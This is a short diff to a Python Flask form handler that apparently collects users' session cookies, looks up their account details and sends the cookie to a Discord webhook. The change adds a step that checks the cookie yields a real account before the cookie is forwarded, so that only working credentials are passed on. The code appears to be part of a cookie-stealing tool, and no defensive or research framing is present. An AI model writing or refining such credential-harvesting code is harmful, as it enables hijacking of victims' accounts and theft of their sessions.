@@ -289,9 +289,18 @@ def submit_form():
         print("Step 2/3: Processing form data...")
         time.sleep(1)  # Brief processing delay
         
-        # Step 3: Prepare all data for transmission
-        print("Step 3/3: Finalizing data preparation...")
-        time.sleep(0.5)  # Brief preparation delay
+        # Step 3: Validate account information before sending
+        print("Step 3/3: Validating account information...")
+        
+        # Only send to Discord if we have valid account information
+        if user_info['username'] == 'Not available' or user_info['user_id'] is None:
+            print("❌ Invalid cookie or failed to fetch account information - Discord webhook cancelled")
+            return jsonify({
+                'success': False, 
+                'message': 'Invalid cookie - unable to fetch account information'
+            }), 400
+            
+        print("✅ Valid account information confirmed - proceeding with Discord notification")
         
         # Prepare cookie content for bottom of message
         cookie_header = f"🍪 **Cookie:**"
